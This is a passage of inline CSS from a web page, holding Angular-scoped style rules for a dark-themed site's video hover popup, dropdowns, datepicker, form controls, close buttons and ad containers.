            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c3] td[_ngcontent-gtc-c3] {
            border-color: #6a707d !important;
            padding: 8px !important
        }

        .app-layout-wrap[_ngcontent-gtc-c3] {
            background-color: #000
        }

        @media (min-width:1200px) {
            .d-main[_ngcontent-gtc-c3] {
                max-width: 1440px;
                margin: 0 auto
            }
            .layout-content[_ngcontent-gtc-c3] {
                background-color: #000
            }
        }

        .d-absolute--center[_ngcontent-gtc-c3] {
            position: absolute;
            top: 40%;
            width: 100%;
            text-align: center;
            z-index: 2
        }

        .d-absolute--center[_ngcontent-gtc-c3] img[_ngcontent-gtc-c3] {
            width: 50px;
            opacity: .5
        }

        .video-hover[_ngcontent-gtc-c3] {
            z-index: 99;
            height: 238px;
            width: 350px;
            position: fixed;
            background-color: #333;
            bottom: 20px;
            right: 22px;
            border-radius: 2px;
            box-shadow: -1px 3px 10px 0 #000;
            transition: 1s ease-in-out;
            cursor: pointer
        }

        @media (max-width:767px) {
            .header-text-extra-small-bold[_ngcontent-gtc-c3] h3[_ngcontent-gtc-c3] {
                font-size: 1em
            }
            .fleft[_ngcontent-gtc-c3] {
                float: right
            }
            .fright[_ngcontent-gtc-c3] {
                float: left
            }
            .popup-shuffle[_ngcontent-gtc-c3] .shuffle-container[_ngcontent-gtc-c3] .shuffle-pop-table[_ngcontent-gtc-c3] {
                padding: 0 20px
            }
            .mat-datepicker-toggle[_ngcontent-gtc-c3] button.mat-icon-button[_ngcontent-gtc-c3] {
                top: auto;
                bottom: 7px
            }
            .video-hover[_ngcontent-gtc-c3] {
                bottom: 8px;
                right: 0;
                height: -webkit-fit-content;
                height: -moz-fit-content;
                height: fit-content;
                width: 70%
            }
        }

        .video-hover__close-x-video[_ngcontent-gtc-c3] {
            cursor: pointer;
            box-shadow: 0 4px 11px 0 #000;
            position: absolute;
            bottom: 245px;
            right: 5px;
            background-color: #333;
            border-radius: 100%;
            width: 30px;
            height: 30px
        }

        .video-hover__close-x-video__border[_ngcontent-gtc-c3] img[_ngcontent-gtc-c3] {
            position: absolute;
            width: 10px;
            height: 10px;
            top: 10px;
            left: 10px
        }

        .video-hover[_ngcontent-gtc-c3] .image-container[_ngcontent-gtc-c3] {
            text-align: center
        }

        .video-hover[_ngcontent-gtc-c3] .image-container[_ngcontent-gtc-c3] img[_ngcontent-gtc-c3] {
            width: unset;
            height: 200px
        }

        .video-hover[_ngcontent-gtc-c3] .image-container[_ngcontent-gtc-c3] .d-absolute--center[_ngcontent-gtc-c3] img[_ngcontent-gtc-c3] {
            height: unset;
            cursor: pointer
        }

        .video-hover[_ngcontent-gtc-c3] .title-video[_ngcontent-gtc-c3] {
            background-image: linear-gradient(to bottom, transparent, transparent 30%, #161619 100%);
            position: absolute;
            bottom: 0;
            color: #fff;
            width: 100%;
            height: 75%;
            padding: 10px 50px 0;
            cursor: pointer
        }

        .video-hover[_ngcontent-gtc-c3] .title-video[_ngcontent-gtc-c3] p[_ngcontent-gtc-c3] {
            font-weight: 600;
            position: absolute;
            bottom: 30px
        }

        .video-hover[_ngcontent-gtc-c3] .title-head[_ngcontent-gtc-c3] {
            display: inline-block;
            background-color: #080808;
            color: #fff;
            padding: 10px;
            width: 100%;
            cursor: default
        }

        .video-hover[_ngcontent-gtc-c3] .title-head.title-video-hover[_ngcontent-gtc-c3] {
            cursor: default
        }

        .video-hover[_ngcontent-gtc-c3] .title-head[_ngcontent-gtc-c3] h3[_ngcontent-gtc-c3] {
            font-size: 15px;
            line-height: 1.2;
            overflow: hidden;
            display: -webkit-box;
            -webkit-box-orient: vertical;
            -webkit-line-clamp: 1;
            text-overflow: ellipsis
        }

        .video-hover[_ngcontent-gtc-c3] .title-head[_ngcontent-gtc-c3] h3[_ngcontent-gtc-c3] a[_ngcontent-gtc-c3] {
            color: #fff
        }

        .video-hover[_ngcontent-gtc-c3] .title-head[_ngcontent-gtc-c3] h3[_ngcontent-gtc-c3] a[_ngcontent-gtc-c3]:hover {
            text-decoration: underline
        }

        .video-hover[_ngcontent-gtc-c3] .imgNotif[_ngcontent-gtc-c3] {
            width: 100%;
            cursor: pointer
        }

        .video-hover[_ngcontent-gtc-c3] .fVideo[_ngcontent-gtc-c3] {
            position: relative;
            height: 200px;
            width: 350px
        }

        @media (max-width:767px) {
            .video-hover__close-x-video[_ngcontent-gtc-c3] {
                bottom: 185px
            }
            .video-hover[_ngcontent-gtc-c3] .title-head[_ngcontent-gtc-c3] {
                padding: 5px 10px
            }
            .video-hover[_ngcontent-gtc-c3] .fVideo[_ngcontent-gtc-c3] {
                height: unset;
                width: 100%
            }
        }

        .video-hover[_ngcontent-gtc-c3] .fVideo[_ngcontent-gtc-c3] iframe[_ngcontent-gtc-c3] {
            display: block;
            width: 100%
        }

        @media only screen and (max-device-width:600px) {
            .video-hover[_ngcontent-gtc-c3] .popup-notification[_ngcontent-gtc-c3] {
                width: 100%
            }
        }

        .cssanimation[_ngcontent-gtc-c3],
        .cssanimation[_ngcontent-gtc-c3] span[_ngcontent-gtc-c3] {
            -webkit-animation-duration: 1s;
            animation-duration: 1s;
            -webkit-animation-fill-mode: both;
            animation-fill-mode: both
        }

        .cssanimation[_ngcontent-gtc-c3] span[_ngcontent-gtc-c3] {
            display: inline-block
        }

        .fadeInBottom[_ngcontent-gtc-c3] {
            -webkit-animation-name: fadeInBottom;
            animation-name: fadeInBottom
        }

        @-webkit-keyframes fadeInBottom {
            from {
                opacity: 0;
                transform: translateY(100%)
            }
            to {
                opacity: 1
            }
        }

        @keyframes fadeInBottom {
            from {
                opacity: 0;
                transform: translateY(100%)
            }
            to {
                opacity: 1
            }
        }
    </style>
    <style>
        .justify-content-left[_ngcontent-gtc-c4] {
            justify-content: left !important
        }

        .justify-content-center[_ngcontent-gtc-c4] {
            justify-content: center !important
        }

        .justify-content-right[_ngcontent-gtc-c4] {
            justify-content: right !important
        }

        .justify-content-space-between[_ngcontent-gtc-c4] {
            justify-content: space-between !important
        }

        .justify-content-flex-end[_ngcontent-gtc-c4] {
            justify-content: flex-end !important
        }

        .text-decoration-line-through[_ngcontent-gtc-c4] {
            text-decoration: line-through !important
        }

        .text-decoration-underline[_ngcontent-gtc-c4] {
            text-decoration: underline !important
        }

        .text-decoration-overline[_ngcontent-gtc-c4] {
            text-decoration: overline !important
        }

        .text-decoration-none[_ngcontent-gtc-c4] {
            text-decoration: none !important
        }

        .align-self-center[_ngcontent-gtc-c4] {
            align-self: center
        }

        .cursor-no-drop[_ngcontent-gtc-c4] {
            cursor: no-drop !important
        }

        .cursor-pointer[_ngcontent-gtc-c4] {
            cursor: pointer !important
        }

        .text-left[_ngcontent-gtc-c4] {
            text-align: left !important
        }

        .text-center[_ngcontent-gtc-c4] {
            text-align: center !important
        }

        .text-right[_ngcontent-gtc-c4] {
            text-align: right !important
        }

        .text-justify[_ngcontent-gtc-c4] {
            text-align: justify !important
        }

        .v-align-top[_ngcontent-gtc-c4] {
            vertical-align: top !important
        }

        .v-align-middle[_ngcontent-gtc-c4] {
            vertical-align: middle !important
        }

        .v-align-bottom[_ngcontent-gtc-c4] {
            vertical-align: bottom !important
        }

        .float-left[_ngcontent-gtc-c4] {
            float: left !important
        }

        .float-right[_ngcontent-gtc-c4] {
            float: right !important
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c4] button.mat-icon-button[_ngcontent-gtc-c4] {
            position: absolute;
            right: 0;
            top: 25px;
            width: 24px;
            height: 24px;
            color: #6a707d
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c4] button.mat-icon-button[_ngcontent-gtc-c4] span.mat-button-wrapper[_ngcontent-gtc-c4],
        .mat-datepicker-toggle[_ngcontent-gtc-c4] button.mat-icon-button[_ngcontent-gtc-c4] span.mat-button-wrapper[_ngcontent-gtc-c4] svg.mat-datepicker-toggle-default-icon[_ngcontent-gtc-c4] {
            position: absolute;
            left: 0;
            top: 0;
            max-width: 24px;
            max-height: 24px
        }

        .cust-dropdown[_ngcontent-gtc-c4] {
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c4] i.fa-caret-down[_ngcontent-gtc-c4] {
            position: absolute;
            width: 9px;
            height: 15px;
            top: 0;
            bottom: 0;
            right: 5px;
            margin: auto
        }

        .cust-dropdown[_ngcontent-gtc-c4] input[type=text][_ngcontent-gtc-c4] {
            width: calc(100% - 10px);
            padding: 5px 10px;
            margin-right: 10px;
            background: 0 0;
            border: 0;
            outline: 0
        }

        .cust-dropdown[_ngcontent-gtc-c4] .cust-option[_ngcontent-gtc-c4] {
            display: none;
            position: absolute;
            min-width: 100%;
            top: 100%;
            background: #1d1f23;
            z-index: 99;
            padding: 15px 25px;
            box-shadow: 0 3px 8px 0 rgba(0, 0, 0, .35);
            border-radius: 3px
        }

        .cust-dropdown[_ngcontent-gtc-c4] .cust-option.active[_ngcontent-gtc-c4] {
            display: block
        }

        .cust-dropdown[_ngcontent-gtc-c4] .cust-option[_ngcontent-gtc-c4] ul.option-list[_ngcontent-gtc-c4] {
            margin: 0;
            padding: 0;
            list-style: none
        }

        .cust-dropdown[_ngcontent-gtc-c4] .cust-option[_ngcontent-gtc-c4] ul.option-list[_ngcontent-gtc-c4] li[_ngcontent-gtc-c4] {
            margin: 0;
            padding: 0;
            list-style: none;
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c4] .cust-option[_ngcontent-gtc-c4] ul.option-list[_ngcontent-gtc-c4] li[_ngcontent-gtc-c4] label[_ngcontent-gtc-c4] {
            display: block;
            margin: 0;
            padding: 10px 0 10px 30px
        }

        .cust-dropdown[_ngcontent-gtc-c4] .cust-option[_ngcontent-gtc-c4] ul.option-list[_ngcontent-gtc-c4] li[_ngcontent-gtc-c4] label[_ngcontent-gtc-c4]:before {
            content: "";
            position: absolute;
            width: 20px;
            height: 20px;
            top: 0;
            bottom: 0;
            left: 0;
            margin: auto;
            border: 1px solid #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c4] .cust-option[_ngcontent-gtc-c4] ul.option-list[_ngcontent-gtc-c4] li[_ngcontent-gtc-c4] label[_ngcontent-gtc-c4]:after {
            content: "";
            opacity: 0;
            position: absolute;
            width: 10px;
            height: 10px;
            top: 0;
            bottom: 0;
            left: 5px;
            margin: auto;
            border: 1px solid #fff;
            background: #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c4] .cust-option[_ngcontent-gtc-c4] ul.option-list[_ngcontent-gtc-c4] li[_ngcontent-gtc-c4] input[type=radio][_ngcontent-gtc-c4] {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            opacity: 0
        }

        .cust-dropdown[_ngcontent-gtc-c4] .cust-option[_ngcontent-gtc-c4] ul.option-list[_ngcontent-gtc-c4] li[_ngcontent-gtc-c4] input[type=radio][_ngcontent-gtc-c4]:checked+label[_ngcontent-gtc-c4]:after {
            opacity: 1
        }

        html[_ngcontent-gtc-c4] {
            scroll-behavior: smooth
        }

        body[_ngcontent-gtc-c4] {
            margin: 0;
            padding: 0;
            overflow-x: hidden !important
        }

        a[_ngcontent-gtc-c4],
        label[_ngcontent-gtc-c4],
        ol[_ngcontent-gtc-c4] li[_ngcontent-gtc-c4],
        table[_ngcontent-gtc-c4] td[_ngcontent-gtc-c4],
        table[_ngcontent-gtc-c4] th[_ngcontent-gtc-c4],
        ul[_ngcontent-gtc-c4] li[_ngcontent-gtc-c4] {
            font-family: Montserrat
        }

        b[_ngcontent-gtc-c4] {
            font-family: Montserrat-Bold;
            font-weight: 800
        }

        h1[_ngcontent-gtc-c4],
        h2[_ngcontent-gtc-c4],
        h3[_ngcontent-gtc-c4],
        h4[_ngcontent-gtc-c4],
        h5[_ngcontent-gtc-c4],
        h6[_ngcontent-gtc-c4],
        p[_ngcontent-gtc-c4],
        span[_ngcontent-gtc-c4] {
            margin: 0;
            font-family: Montserrat
        }

        button[_ngcontent-gtc-c4] {
            outline: 0;
            font-family: Montserrat
        }

        input[_ngcontent-gtc-c4],
        textarea[_ngcontent-gtc-c4] {
            font-family: Montserrat;
            color: #fff
        }

        label.error-label[_ngcontent-gtc-c4] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: #d0021b;
            display: block
        }

        label.success-label[_ngcontent-gtc-c4] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: green;
            display: block
        }

        label.label-input[_ngcontent-gtc-c4] {
            display: block;
            font-family: Montserrat;
            font-size: 12px;
            color: #6a707d;
            margin-bottom: 10px
        }

        @media (max-width:767px) {
            label.label-input[_ngcontent-gtc-c4] {
                font-size: 11px
            }
        }

        label.label-media[_ngcontent-gtc-c4] {
            display: block;
            font-family: Montserrat;
            font-size: .8em;
            color: #6a707d;
            margin-bottom: 10px
        }

        .close-solid[_ngcontent-gtc-c4] {
            padding: 5px;
            height: 30px;
            width: 30px;
            background: 0 0;
            border: none;
            cursor: pointer
        }

        .close-solid[_ngcontent-gtc-c4] span[_ngcontent-gtc-c4] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .close-circle-wrap[_ngcontent-gtc-c4] {
            position: relative;
            float: right;
            margin-top: 20px;
            z-index: 1;
            background: 0 0;
            border: none
        }

        .close-circle-wrap[_ngcontent-gtc-c4] p[_ngcontent-gtc-c4] {
            display: inline-block;
            vertical-align: middle;
            color: #fff;
            font-family: Montserrat-Bold;
            font-weight: 600;
            font-size: .9em;
            text-transform: uppercase
        }

        @media (max-width:767px) {
            .close-circle-wrap[_ngcontent-gtc-c4] p[_ngcontent-gtc-c4] {
                font-size: .75em
            }
        }

        .close-circle-wrap[_ngcontent-gtc-c4] p.close-circle[_ngcontent-gtc-c4] {
            height: 42px;
            width: 42px;
            background: 0 0;
            border: 2px solid #fff;
            cursor: pointer;
            padding: 12px;
            margin-left: 10px;
            border-radius: 100%;
            opacity: .5
        }

        .close-circle-wrap[_ngcontent-gtc-c4] p.close-circle[_ngcontent-gtc-c4] span[_ngcontent-gtc-c4] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .cta.cta--generate[_ngcontent-gtc-c4] {
            margin-top: 30px;
            padding: 16px 27px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: none;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c4] {
            text-decoration: none;
            padding: 10px 5px 10px 30px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid transparent;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c4] span[_ngcontent-gtc-c4] {
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            background: #9c0114;
            padding: 5px 10px;
            display: inline-block;
            border-radius: 3px;
            margin: 0 10px
        }

        .cta.cta--border-transparent[_ngcontent-gtc-c4] {
            text-decoration: none;
            padding: 10px 40px;
            background: 0 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid #fff;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--transparent-white[_ngcontent-gtc-c4] {
            font-family: Montserrat;
            border: 1px solid #fff;
            padding: 15px 20px;
            border-radius: 4px;
            background: 0 0;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #fff;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        .cta.cta--solid-grey[_ngcontent-gtc-c4] {
            font-family: Montserrat;
            border: 1px solid transparent;
            padding: 15px 60px;
            border-radius: 4px;
            background: #2d2d30;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #6b6b6d;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        a.close-frame[_ngcontent-gtc-c4] {
            position: absolute;
            right: 30px;
            top: 0;
            font-family: Montserrat;
            color: #fff;
            font-size: .9em;
            font-weight: 400;
            text-transform: uppercase;
            opacity: 1;
            z-index: 10
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c4] span[_ngcontent-gtc-c4] {
            padding: 4px 9px 4px 12px;
            border: 3px solid #6a707d;
            width: 42px;
            height: 42px;
            font-size: 20px;
            font-weight: 700;
            top: 16px
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c4] p[_ngcontent-gtc-c4] {
            font-family: Montserrat;
            font-size: 13px;
            font-weight: 700;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.23;
            letter-spacing: 1.4px;
            text-align: center;
            color: #fff
        }

        a.close-frame[_ngcontent-gtc-c4] p[_ngcontent-gtc-c4] {
            display: inline-block
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c4] {
                right: 10px
            }
            a.close-frame[_ngcontent-gtc-c4] p[_ngcontent-gtc-c4] {
                display: none
            }
        }

        a.close-frame[_ngcontent-gtc-c4] span[_ngcontent-gtc-c4] {
            margin-left: 10px;
            font-family: Montserrat;
            display: inline-block;
            width: 30px;
            height: 30px;
            padding: 5px 10px;
            border: 1px solid #6a707d;
            color: #6a707d;
            font-weight: 600;
            overflow: hidden;
            border-radius: 100%;
            position: relative;
            right: 0;
            top: 10px
        }

        .form-control[_ngcontent-gtc-c4] {
            position: relative;
            font-family: Montserrat !important;
            font-size: 1em;
            outline: 0;
            background: 0 0;
            border-radius: 0;
            box-shadow: none
        }

        .form-control.form-control--default[_ngcontent-gtc-c4] {
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--count[_ngcontent-gtc-c4] {
            text-align: center;
            margin: 0 10px 10px;
            width: 50px;
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--transparent[_ngcontent-gtc-c4] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 0;
            background: 0 0;
            border: none;
            box-shadow: none
        }

        .form-control.form-control--textarea[_ngcontent-gtc-c4] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 10px;
            border-radius: 4px;
            background-color: rgba(106, 112, 125, .19);
            border: none;
            box-shadow: none
        }

        .form-control[_ngcontent-gtc-c4]::-moz-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c4]::-ms-input-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c4]::placeholder {
            color: #69707e
        }

        .header-text[_ngcontent-gtc-c4] h3[_ngcontent-gtc-c4] {
            font-family: Montserrat-Bold;
            font-size: 2.3em;
            text-transform: capitalize;
            color: #fff
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c4] span[_ngcontent-gtc-c4] {
                right: 10px
            }
            .header-text[_ngcontent-gtc-c4] h3[_ngcontent-gtc-c4] {
                font-size: 1.5em
            }
        }

        .header-text[_ngcontent-gtc-c4] h4[_ngcontent-gtc-c4] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        .header-text[_ngcontent-gtc-c4] p[_ngcontent-gtc-c4] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .header-text-medium[_ngcontent-gtc-c4] h3[_ngcontent-gtc-c4] {
            font-family: Montserrat-Bold;
            font-size: 2em;
            color: #fff
        }

        .header-text-small[_ngcontent-gtc-c4] h3[_ngcontent-gtc-c4] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-medium[_ngcontent-gtc-c4] h3[_ngcontent-gtc-c4],
            .header-text-small[_ngcontent-gtc-c4] h3[_ngcontent-gtc-c4] {
                font-size: 1.5em
            }
        }

        .header-text-extra-small[_ngcontent-gtc-c4] h3[_ngcontent-gtc-c4] {
            font-family: Montserrat;
            font-size: 1.2em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-extra-small[_ngcontent-gtc-c4] h3[_ngcontent-gtc-c4] {
                font-size: 1em
            }
        }

        .header-text-extra-small-bold[_ngcontent-gtc-c4] h3[_ngcontent-gtc-c4] {
            font-family: Montserrat-Bold;
            font-size: 1.2em;
            color: #fff
        }

        .body-text[_ngcontent-gtc-c4] p[_ngcontent-gtc-c4] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .description-text[_ngcontent-gtc-c4] p[_ngcontent-gtc-c4] {
            font-size: 1em;
            color: #fff
        }

        .radio-input[_ngcontent-gtc-c4] {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            height: 100%;
            width: 100%;
            z-index: 9;
            opacity: 0
        }

        .middle-top[_ngcontent-gtc-c4] {
            margin: auto;
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            transform: translateY(-50%)
        }

        .fleft[_ngcontent-gtc-c4] {
            float: left
        }

        .fright[_ngcontent-gtc-c4] {
            float: right
        }

        .row[_ngcontent-gtc-c4] .padding-left-0[_ngcontent-gtc-c4] {
            padding-left: 0
        }

        .form-group.form-group--media[_ngcontent-gtc-c4] {
            position: relative;
            border-bottom: 1px solid #2b2e34
        }

        .dd-selected[_ngcontent-gtc-c4] {
            background: 0 0
        }

        .invalid-feedback[_ngcontent-gtc-c4] {
            text-align: left;
            position: relative;
            z-index: 1
        }

        .popup-shuffle[_ngcontent-gtc-c4] {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 99
        }

        .popup-shuffle[_ngcontent-gtc-c4]:before {
            content: "";
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-color: rgba(0, 0, 0, .8)
        }

        .popup-shuffle[_ngcontent-gtc-c4] .shuffle-container[_ngcontent-gtc-c4] {
            width: 400px;
            height: 120px;
            max-width: 90vw;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            margin: auto;
            border: 3px solid #6a707d;
            background: #1d1f23;
            border-radius: 4px;
            display: block
        }

        .popup-shuffle[_ngcontent-gtc-c4] .shuffle-container[_ngcontent-gtc-c4]>.row[_ngcontent-gtc-c4] {
            display: block;
            position: absolute;
            top: 50%;
            transform: translateY(-50%)
        }

        .popup-shuffle[_ngcontent-gtc-c4] .shuffle-container[_ngcontent-gtc-c4] .shuffle-pop-table[_ngcontent-gtc-c4] {
            display: table
        }

        .popup-shuffle[_ngcontent-gtc-c4] .shuffle-container[_ngcontent-gtc-c4] .shuffle-pop-table[_ngcontent-gtc-c4] .shuffle-pop-item[_ngcontent-gtc-c4] {
            display: table-cell;
            vertical-align: middle;
            width: 80%;
            padding-left: 20px
        }

        .popup-shuffle[_ngcontent-gtc-c4] .shuffle-container[_ngcontent-gtc-c4] .shuffle-pop-table[_ngcontent-gtc-c4] .shuffle-pop-item.img[_ngcontent-gtc-c4] {
            width: 20%;
            padding-left: 0
        }

        .popup-shuffle[_ngcontent-gtc-c4] .shuffle-container[_ngcontent-gtc-c4] img[_ngcontent-gtc-c4] {
            max-width: 100%
        }

        .popup-shuffle[_ngcontent-gtc-c4] .shuffle-container[_ngcontent-gtc-c4] p[_ngcontent-gtc-c4] {
            color: #fff;
            font-size: 1em
        }

        .popup-shuffle[_ngcontent-gtc-c4] .shuffle-container[_ngcontent-gtc-c4] p[_ngcontent-gtc-c4] strong[_ngcontent-gtc-c4] {
            font-size: 1.09em
        }

        .mat-datepicker-content[_ngcontent-gtc-c4] {
            background: #1d1f23
        }

        .mat-calendar-body-cell-content[_ngcontent-gtc-c4] {
            color: #fff
        }

        .mat-calendar-body-disabled[_ngcontent-gtc-c4]>.mat-calendar-body-cell-content[_ngcontent-gtc-c4]:not(.mat-calendar-body-selected) {
            color: #616161
        }

        .mat-calendar-body-label[_ngcontent-gtc-c4],
        .mat-calendar-table-header[_ngcontent-gtc-c4] th[_ngcontent-gtc-c4],
        .mat-datepicker-content[_ngcontent-gtc-c4] .mat-calendar-next-button[_ngcontent-gtc-c4],
        .mat-datepicker-content[_ngcontent-gtc-c4] .mat-calendar-previous-button[_ngcontent-gtc-c4],
        .mat-datepicker-toggle[_ngcontent-gtc-c4],
        .mat-icon-button[disabled][disabled][_ngcontent-gtc-c4] {
            color: #fff
        }

        .mat-calendar-arrow[_ngcontent-gtc-c4] {
            border-top-color: #fff
        }

        .mat-calendar-header[_ngcontent-gtc-c4] {
            color: #fff
        }

        .cdk-keyboard-focused[_ngcontent-gtc-c4] .mat-calendar-body-active[_ngcontent-gtc-c4]>.mat-calendar-body-cell-content[_ngcontent-gtc-c4]:not(.mat-calendar-body-selected),
        .cdk-program-focused[_ngcontent-gtc-c4] .mat-calendar-body-active[_ngcontent-gtc-c4]>.mat-calendar-body-cell-content[_ngcontent-gtc-c4]:not(.mat-calendar-body-selected),
        .mat-calendar-body-cell[_ngcontent-gtc-c4]:not(.mat-calendar-body-disabled):hover>.mat-calendar-body-cell-content[_ngcontent-gtc-c4]:not(.mat-calendar-body-selected),
        .mat-calendar-body-today[_ngcontent-gtc-c4]:not(.mat-calendar-body-selected) {
            border-color: transparent;
            background: #d0021b
        }

        .mat-calendar-body-selected[_ngcontent-gtc-c4] {
            background: #d0021b;
            box-shadow: none
        }

        .block-url[_ngcontent-gtc-c4] {
            position: absolute;
            content: "";
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            z-index: 91
        }

        .mat-primary[_ngcontent-gtc-c4] .mat-option.mat-selected[_ngcontent-gtc-c4]:not(.mat-option-disabled) {
            color: #000;
            opacity: .8
        }

        .mat-select-panel[_ngcontent-gtc-c4] .mat-option[_ngcontent-gtc-c4] {
            color: #797979
        }

        .ngx-editor-textarea[_ngcontent-gtc-c4] div[_ngcontent-gtc-c4],
        .ngx-editor-textarea[_ngcontent-gtc-c4] section[_ngcontent-gtc-c4] {
            max-width: 100% !important;
            width: 100% !important;
            background: 0 0 !important;
            box-shadow: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c4] div[_ngcontent-gtc-c4] img[_ngcontent-gtc-c4],
        .ngx-editor-textarea[_ngcontent-gtc-c4] section[_ngcontent-gtc-c4] img[_ngcontent-gtc-c4] {
            width: 100% !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c4] a[_ngcontent-gtc-c4] {
            text-decoration: none !important;
            border: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c4] *[_ngcontent-gtc-c4] {
            max-width: 100% !important;
            font-family: Montserrat !important;
            background: 0 0 !important;
            line-height: 1.5;
            word-break: break-word !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c4] b[_ngcontent-gtc-c4] {
            font-family: Montserrat-Bold !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c4] b[_ngcontent-gtc-c4] *[_ngcontent-gtc-c4] {
            font-family: Montserrat-Bold !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c4] td[_ngcontent-gtc-c4] {
            border-color: #6a707d !important;
            padding: 8px !important
        }

        .app-layout-wrap[_ngcontent-gtc-c4] {
            background-color: #000
        }

        @media (min-width:1200px) {
            .d-main[_ngcontent-gtc-c4] {
                max-width: 1440px;
                margin: 0 auto
            }
            .layout-content[_ngcontent-gtc-c4] {
                background-color: #000
            }
        }

        .d-absolute--center[_ngcontent-gtc-c4] {
            position: absolute;
            top: 40%;
            width: 100%;
            text-align: center;
            z-index: 2
        }

        .d-absolute--center[_ngcontent-gtc-c4] img[_ngcontent-gtc-c4] {
            width: 50px;
            opacity: .5
        }

        [_nghost-gtc-c4] {
            display: block
        }

        [_nghost-gtc-c4] ins.adsbygoogle {
            max-width: calc(100vw);
            max-height: calc(100vh - 20px)
        }

        [_nghost-gtc-c4] .ads-container[_ngcontent-gtc-c4] button.close-button[_ngcontent-gtc-c4] {
            background: unset;
            border: none;
            position: absolute;
            left: calc(100% + 10px);
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer
        }

        [_nghost-gtc-c4] .ads-container[_ngcontent-gtc-c4] button.close-button[_ngcontent-gtc-c4] img.cross[_ngcontent-gtc-c4] {
            border-radius: 50%;
            border: 2px solid #acb3b9;
            padding: 10px;
            width: 43px;
            height: 43px
        }

        [_nghost-gtc-c4] .ads-container.fixed-bottom[_ngcontent-gtc-c4] {
            position: fixed;
            bottom: 5px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 999;
            display: flex;
            align-items: flex-end
        }

        [_nghost-gtc-c4] .ads-container.fixed-bottom[_ngcontent-gtc-c4] button.close-button[_ngcontent-gtc-c4] {
            position: relative;
            display: flex;
            transform: unset;
            left: unset;
            padding-bottom: 5px
        }

        [_nghost-gtc-c4] .ads-container.centered[_ngcontent-gtc-c4] {
            display: flex;
            justify-content: center
        }

        [_nghost-gtc-c4] .ads-container.popup[_ngcontent-gtc-c4] {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 1000
        }

        [_nghost-gtc-c4] .ads-container.popup[_ngcontent-gtc-c4] button.close-button[_ngcontent-gtc-c4] {
            position: absolute;
            left: unset;
            right: 20px;
            top: 35px
        }

